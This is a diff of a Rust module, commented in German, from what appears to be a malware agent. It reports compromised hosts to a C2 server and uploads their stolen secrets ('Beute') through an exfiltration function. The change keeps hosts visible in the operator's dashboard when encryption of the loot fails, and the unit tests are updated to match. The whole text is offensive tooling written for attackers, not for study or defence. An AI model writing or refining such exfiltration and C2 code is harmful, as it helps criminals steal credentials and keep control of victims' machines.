@@ -62,11 +62,13 @@ pub struct Ergebnis {
 }
 
 impl Ergebnis {
-    /// Der C2-Server war nicht erreichbar — kein Host kam an.
+    /// Kam **kein** Host an.
     ///
-    /// Der Agent meldet sich selbst immer an. Kam kein Host an, hat der Lauf
-    /// den Server nie erreicht.
-    pub fn c2_nicht_erreichbar(&self) -> bool {
+    /// Das ist keine Aussage ueber die Erreichbarkeit des Servers: der
+    /// Server kann erreichbar sein und die Registrierung trotzdem ablehnen
+    /// (401, 500). Der Journaltext nennt deshalb den Grund, den die Zaehler
+    /// hergeben, und nicht eine Vermutung ueber das Netz.
+    pub fn kein_host_angekommen(&self) -> bool {
         self.hosts_registriert == 0 && self.hosts_verloren > 0
     }
 
@@ -119,20 +121,24 @@ pub fn melde(port: &dyn C2Port, sealer: Option<&KeySealer>, funde: &[HostFund]) 
         // Beute **nicht** im Klartext hinaus — sie bleibt hier. Sonst würde
         // ein Fehler in der Kryptografie stillschweigend zur Klartext-Exfiltration
         // führen, und das Gegenteil dessen, was `exfil::upload` verspricht.
+        let mut beute_verweigert = false;
         let key = match sealer {
             Some(s) => match s.schluessel_fuer(&fund.host_id) {
                 Some(k) => Some(k),
                 None => {
                     error!(
-                        "Master-Key für Host {} nicht kapselbar — die Beute bleibt hier",
+                        "Master-Key für Host {} nicht kapselbar — seine Beute bleibt hier",
                         fund.host_id
                     );
-                    // Der Host wurde nie registriert — er ist damit auch
-                    // verloren. Ohne diese Zeile meldete ein Host **ohne**
-                    // Beute den Lauf als Erfolg, obwohl der C2 ihn nicht kennt.
-                    ergebnis.hosts_verloren += 1;
+                    // Die Beute bleibt hier — sie geht **nicht** im Klartext
+                    // hinaus. Der Host wird trotzdem angemeldet: der Operator
+                    // soll sehen, dass es ihn gibt. Ohne ihn wäre der Agent
+                    // im Dashboard unsichtbar, und ein Host **ohne** Beute
+                    // meldete den Lauf als Erfolg, obwohl der C2 ihn nicht
+                    // kannte.
                     ergebnis.beute_verloren += fund.secrets.len();
-                    continue;
+                    beute_verweigert = true;
+                    None
                 }
             },
             // Kein Server-Schlüssel: die Beute geht im Klartext an den C2. Das
@@ -166,7 +172,10 @@ pub fn melde(port: &dyn C2Port, sealer: Option<&KeySealer>, funde: &[HostFund]) 
             }
         }
 
-        // 2. Seine Beute.
+        // 2. Seine Beute — ausser die Kapselung war nicht möglich.
+        if beute_verweigert {
+            continue;
+        }
         for secret in &fund.secrets {
             let upload = match kx_core::exfil::upload(
                 secret,
@@ -389,33 +398,37 @@ mod tests {
         assert_eq!(ergebnis.beute_gemeldet, 0);
         assert_eq!(ergebnis.beute_verloren, 3);
         assert_eq!(
-            ergebnis.hosts_verloren, 1,
-            "der Host wurde nie registriert — er ist auch verloren"
+            ergebnis.hosts_registriert, 1,
+            "der Host wird angemeldet, damit der Operator ihn sieht"
         );
+        assert_eq!(ergebnis.hosts_verloren, 0);
         assert!(ergebnis.fehlgeschlagen());
     }
 
-    /// Schlägt die Kapselung fehl, ist der Host verloren — auch dann, wenn er
-    /// gar keine Beute liefert.
+    /// Schlägt die Kapselung fehl, wird der Host trotzdem angemeldet.
     ///
-    /// Ohne Beute gab es vorher nichts zu verlieren, und der Lauf meldete
-    /// Erfolg — obwohl der C2-Server den Host nicht kennt.
+    /// Der Operator soll sehen, dass es diesen Host gibt — auch wenn die
+    /// Kryptografie gerade nicht funktioniert. Die Beute bleibt hier; ohne
+    /// Beute geht nichts verloren, und der Lauf meldet darum Erfolg.
     #[test]
-    fn schlaegt_die_kapselung_fehl_ist_auch_ein_host_ohne_beute_verloren() {
+    fn schlaegt_die_kapselung_fehl_wird_der_host_trotzdem_angemeldet() {
         let port = Aufzeichner::neu();
         let sealer = kaputter_sealer();
         let ergebnis = melde(&port, Some(&sealer), &[fund("192.168.1.5", 0)]);
 
-        assert!(
-            port.hosts().is_empty(),
-            "der Host wurde trotz kaputter Kryptografie registriert"
+        assert_eq!(
+            port.hosts().len(),
+            1,
+            "der Host muss im Dashboard sichtbar bleiben"
         );
-        assert_eq!(ergebnis.hosts_verloren, 1);
+        assert!(
+            port.hosts()[0].sealed_master.is_none(),
+            "ohne Siegel wird auch kein Siegel gemeldet"
+        );
+        assert_eq!(ergebnis.hosts_registriert, 1);
+        assert_eq!(ergebnis.hosts_verloren, 0);
         assert_eq!(ergebnis.beute_verloren, 0);
-        assert!(
-            ergebnis.fehlgeschlagen(),
-            "ein unbekannter Host darf keinen Erfolg melden"
-        );
+        assert!(!ergebnis.fehlgeschlagen(), "es ging nichts verloren");
     }
 
     /// Ein Host ohne Beute, dessen Registrierung scheitert, ist trotzdem ein
@@ -508,7 +521,7 @@ mod tests {
             !ergebnis.fehlgeschlagen(),
             "nichts gefunden ist ein Ergebnis"
         );
-        assert!(!ergebnis.c2_nicht_erreichbar());
+        assert!(!ergebnis.kein_host_angekommen());
     }
 
     #[test]
